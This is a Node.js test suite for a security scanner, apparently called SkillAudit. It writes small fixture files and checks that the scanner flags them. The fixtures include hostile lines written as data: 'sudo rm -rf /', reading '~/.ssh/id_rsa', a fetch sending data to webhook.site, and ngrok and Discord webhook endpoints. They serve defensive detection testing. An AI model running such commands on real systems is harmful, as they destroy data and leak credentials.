#!/usr/bin/env node

/**
 * SkillAudit Test Suite
 * Tests the security scanner patterns and detection logic
 */

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { execSync } from 'child_process';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const RESET = '\x1b[0m';
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`${GREEN}✅ ${name}${RESET}`);
    passed++;
  } catch (err) {
    console.log(`${RED}❌ ${name}${RESET}`);
    console.log(`   ${err.message}`);
    failed++;
  }
}

function assert(condition, message = 'Assertion failed') {
  if (!condition) throw new Error(message);
}

// Create temp directory for test files
const tmpDir = '/tmp/skillaudit-tests';
if (fs.existsSync(tmpDir)) {
  fs.rmSync(tmpDir, { recursive: true });
}
fs.mkdirSync(tmpDir, { recursive: true });

// Helper to run scanner and get JSON output
function scanFile(filepath) {
  try {
    const result = execSync(`node "${path.join(__dirname, 'index.js')}" --json "${filepath}"`, {
      encoding: 'utf8'
    });
    return JSON.parse(result);
  } catch (err) {
    // Scanner exits with non-zero for findings - still parse the output
    if (err.stdout) {
      return JSON.parse(err.stdout);
    }
    throw err;
  }
}

// ============================================================
// CREDENTIAL ACCESS TESTS
// ============================================================

test('detects .env file access', () => {
  const testFile = path.join(tmpDir, 'test-env.js');
  fs.writeFileSync(testFile, `
    const config = fs.readFileSync('.env');
    console.log(config);
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('.env')), 'Should detect .env');
});

test('detects process.env access', () => {
  const testFile = path.join(tmpDir, 'test-process-env.js');
  fs.writeFileSync(testFile, `
    const apiKey = process.env.API_KEY;
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('environment')), 'Should detect process.env');
});

test('detects API_KEY references', () => {
  const testFile = path.join(tmpDir, 'test-api-key.md');
  fs.writeFileSync(testFile, `
    # Setup
    Set your API_KEY in the config file.
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('API keys')), 'Should detect API_KEY');
});

test('detects SSH directory access', () => {
  const testFile = path.join(tmpDir, 'test-ssh.sh');
  fs.writeFileSync(testFile, `
    cat ~/.ssh/id_rsa
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('SSH')), 'Should detect SSH access');
});

// ============================================================
// SUSPICIOUS NETWORK TESTS
// ============================================================

test('detects webhook.site', () => {
  const testFile = path.join(tmpDir, 'test-webhook.js');
  fs.writeFileSync(testFile, `
    fetch('https://webhook.site/abc123', { body: data });
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('exfiltration')), 'Should detect webhook.site');
});

test('detects ngrok tunnels', () => {
  const testFile = path.join(tmpDir, 'test-ngrok.js');
  fs.writeFileSync(testFile, `
    const endpoint = 'https://abc123.ngrok.io/data';
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('Tunnel')), 'Should detect ngrok');
});

test('detects Discord webhooks', () => {
  const testFile = path.join(tmpDir, 'test-discord.js');
  fs.writeFileSync(testFile, `
    fetch('https://discord.com/api/webhooks/123/abc');
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('Discord')), 'Should detect Discord webhooks');
});

// ============================================================
// DANGEROUS OPERATIONS TESTS
// ============================================================

test('detects eval()', () => {
  const testFile = path.join(tmpDir, 'test-eval.js');
  fs.writeFileSync(testFile, `
    eval(userInput);
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('eval')), 'Should detect eval');
});

test('detects child_process', () => {
  const testFile = path.join(tmpDir, 'test-child.js');
  fs.writeFileSync(testFile, `
    import { exec } from 'child_process';
    exec('ls -la');
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('Child process')), 'Should detect child_process');
});

test('detects sudo', () => {
  const testFile = path.join(tmpDir, 'test-sudo.sh');
  fs.writeFileSync(testFile, `
    sudo rm -rf /
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('Elevated')), 'Should detect sudo');
});

test('detects rm -rf', () => {
  const testFile = path.join(tmpDir, 'test-rm.sh');
  fs.writeFileSync(testFile, `
    rm -rf ./data
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('deletion')), 'Should detect rm -rf');
});

// ============================================================
// OBFUSCATION TESTS
// ============================================================

test('detects atob (base64 decode)', () => {
  const testFile = path.join(tmpDir, 'test-atob.js');
  fs.writeFileSync(testFile, `
    const decoded = atob('aGVsbG8=');
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('Base64')), 'Should detect atob');
});

test('detects fromCharCode', () => {
  const testFile = path.join(tmpDir, 'test-charcode.js');
  fs.writeFileSync(testFile, `
    String.fromCharCode(72, 101, 108, 108, 111);
  `);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.description && f.description.includes('Character code')), 'Should detect fromCharCode');
});

// ============================================================
// CLEAN FILE TESTS
// ============================================================

test('clean file returns no findings', () => {
  const testFile = path.join(tmpDir, 'test-clean.js');
  fs.writeFileSync(testFile, `
    // A completely safe skill
    function greet(name) {
      return 'Hello, ' + name + '!';
    }
    console.log(greet('World'));
  `);
  const findings = scanFile(testFile);
  assert(findings.length === 0, `Clean file should have no findings, got ${findings.length}`);
});

// ============================================================
// SEVERITY TESTS
// ============================================================

test('credential access is CRITICAL', () => {
  const testFile = path.join(tmpDir, 'test-severity-crit.js');
  fs.writeFileSync(testFile, `const x = process.env.SECRET_KEY;`);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.severity === 'CRITICAL'), 'Should be CRITICAL');
});

test('suspicious network is HIGH', () => {
  const testFile = path.join(tmpDir, 'test-severity-high.js');
  fs.writeFileSync(testFile, `fetch('https://webhook.site/x');`);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.severity === 'HIGH'), 'Should be HIGH');
});

test('obfuscation is MEDIUM', () => {
  const testFile = path.join(tmpDir, 'test-severity-med.js');
  fs.writeFileSync(testFile, `const x = atob('test');`);
  const findings = scanFile(testFile);
  assert(findings.some(f => f.severity === 'MEDIUM'), 'Should be MEDIUM');
});

// ============================================================
// SUMMARY
// ============================================================

console.log('\n' + '─'.repeat(40));
console.log(`Tests: ${passed} passed, ${failed} failed`);

// Cleanup
fs.rmSync(tmpDir, { recursive: true });

process.exit(failed > 0 ? 1 : 0);
